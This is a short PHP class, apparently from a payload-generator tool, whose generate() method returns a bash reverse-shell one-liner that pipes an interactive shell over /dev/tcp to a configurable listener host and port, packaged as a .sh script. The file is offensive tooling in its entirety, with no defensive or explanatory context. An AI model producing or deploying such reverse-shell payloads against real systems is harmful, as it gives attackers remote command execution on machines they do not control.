<?php
namespace App\Modules\PayloadGenerator;

class LinuxBuilder extends Builder
{
    public function generate(): string
    {
        // Bash reverse shell
        $payload = "bash -i >& /dev/tcp/{$this->lhost}/{$this->lport} 0>&1";
        return $payload;
    }

    public function getFileExtension(): string { return 'sh'; }
    public function getMimeType(): string { return 'application/x-shellscript'; }
}
